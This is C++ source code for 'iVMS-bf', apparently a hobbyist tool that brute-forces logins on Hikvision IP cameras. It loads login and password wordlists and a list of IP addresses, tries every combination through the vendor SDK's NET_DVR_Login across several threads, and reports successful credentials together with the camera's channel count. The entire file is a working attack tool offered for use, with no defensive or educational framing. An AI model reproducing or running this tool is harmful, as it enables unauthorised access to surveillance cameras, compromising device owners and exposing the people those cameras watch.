#include "../hikvision/HCNetSDK.h"

#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>

#include "argp.h"


#define PRINT_EVERYTHING  (options.verbosity >= 2)
#define PRINT_RESULT      (options.verbosity >= 1)

const char *argp_program_version = "iVMS-bf 0.1 alpha";
const char *argp_program_bug_address = "superhacker777@yandex.ru";
static char doc[] = "Description here.";
static char args_doc[] = "[FILENAME]...";
static struct argp_option arg_options[] = { 
    { "threads", 't', "COUNT", 0, "Number of threads. Default is 1."},
    { "port", 'p', "PORT_NUMBER", 0, "Camera port. You probably need 8000, so it's default value."},
    { "ips", 'i', "FILE", 0, "A file with a list of IPs." },
    { "verbose-level", 'v', "LEVEL", 0, "Define verbosity of output. 0 - silent, 1 (normal; default) - only print results, 2 (debug) - print whatever could be printed so your mom will think you're a cool."},
    { 0 }
};

struct Options {
  unsigned int    concurrency;
  unsigned int    verbosity;
  unsigned short  port;
  std::string     ips_file;
};

static Options options = {
  1,     // Concurrency
  1,     // Verbosity level
  8000   // Port
};

static std::vector<std::string> logins, passwords, ips;
static std::mutex sync;

static error_t parse_opt(int key, char *arg, struct argp_state *state) {
  if (state == NULL)
    return EINVAL;

  Options * arguments = static_cast<Options *>(state->input);

  switch (key) {
  case 't':
    sscanf(arg, "%u", &arguments->concurrency);
    break;
  case 'p':
    sscanf(arg, "%hu", &arguments->port);
    break;
  case 'i':
    &arguments->ips_file.assign(arg);
    break;
  case 'v':
    sscanf(arg, "%u", &arguments->verbosity);
    break;
  case ARGP_KEY_ARG:
    //ips.push_back(std::string(arg));

    return 0;
  default:
    return ARGP_ERR_UNKNOWN;
  }

  return 0;
}

static struct argp argp = { arg_options, parse_opt, args_doc, doc, 0, 0, 0 };

// TODO:
//   Check for file existance.
void load_data() {
  std::ifstream file;
  std::string line;

  file.open("logins", std::ifstream::in);
  while (std::getline(file, line))
    logins.push_back(line);
  file.close();

  file.open("passwords", std::ifstream::in);
  while (std::getline(file, line))
    passwords.push_back(line);
  file.close();

  if (!options.ips_file.empty())
  {
    file.open(options.ips_file, std::ifstream::in);
    while (std::getline(file, line))
      ips.push_back(line);
    file.close();
  }
}

void bruteforce()
{
  while (true)
  {
    std::string ip;
    
    // I'm trying to be as careful as I can be.
    // Really.

    sync.lock();
    
    if (!ips.empty())
    {
      ip = ips.back();
      ips.pop_back();
    }
    else
    {
      sync.unlock();
      break;
    }

    sync.unlock();


    // TODO:
    //   We need to make something like single RTSP ping here to detect dead cameras


    for (const auto &login : logins)
    {
      for (const auto &password : passwords)
      {
        if (PRINT_EVERYTHING)
          std::cout << "Trying " << login << ":" << password << " for " << ip << "..." << std::endl;

        NET_DVR_Init();

        NET_DVR_DEVICEINFO device_info;
        device_info.byChanNum = 0;

        // IP, login and password aren't const? Really?
        char * c_ip = new char[ip.size() + 1];
        std::copy(ip.begin(), ip.end(), c_ip);
        c_ip[ip.size()] = '\0';

        char * c_login = new char[login.size() + 1];
        std::copy(login.begin(), login.end(), c_login);
        c_login[login.size()] = '\0';

        char * c_password = new char[password.size() + 1];
        std::copy(password.begin(), password.end(), c_password);
        c_password[password.size()] = '\0';

        // There's no thread safety, so it's useless to save return value

        NET_DVR_Login(c_ip,
                      options.port,
                      c_login,
                      c_password,
                      &device_info);

        delete(c_ip);
        delete(c_login);
        delete(c_password);

        // We're searching for channels.

        bool login_success = (device_info.byChanNum > 0);

        if (login_success)
        {
          if (PRINT_RESULT)
            std::cout << "Login success: " << login << ":" << password << "@" << ip << " (channels: " << (int) device_info.byChanNum << ")" << std::endl;

          NET_DVR_Cleanup();
          
          goto NextPlease;
        }
        else
        {
          // I'm not really sure if this shit is thread-safe or something.
          // I hope it is.
          // I'm a believer.
          //
          //                      |
          // READ UPD DOWN THERE \ /
          //                      V

          int error = NET_DVR_GetLastError();

          if (PRINT_EVERYTHING)
            std::cout << "Login failed. Error code: " << error << std::endl;

          NET_DVR_Cleanup();

          // // We're not interested in spending our precious time watching dead cameras being dead.
          // // There are only two *good* error codes:
          // //
          // //   1   — invalid credentials;
          // //   152 — same shit for maybe newer firmwares, not really documented;
          // //   44  — something wrong with some buffer somewhere, but it doesn't mean that camera is dead;

          // if ((error != 1) && (error != 152))
          //   goto NextPlease;

          // UPD: there's no thread safety, eh.
        }
      }
    }

NextPlease: ;
  }
}

void spawn_threads(unsigned int t_count)
{
  if (PRINT_EVERYTHING)
    std::cout << "Spawning " << t_count << " threads..." << std::endl;

  std::vector<std::thread> threads;
  for (unsigned int i = 0; i < t_count; i++)
    threads.push_back(std::thread(bruteforce));

  for (unsigned int i = 0; i < t_count; i++)
    threads[i].join();
}

int main(int argc, char* argv[])
{
  argp_parse(&argp, argc, argv, 0, 0, &options);

  load_data();

  if (ips.empty())
  {
    if (PRINT_RESULT)
      std::cout << "No IP has given. Nothing to do." << std::endl;

    return 0;
  }

  spawn_threads(options.concurrency);

  bruteforce();

  return 0;
}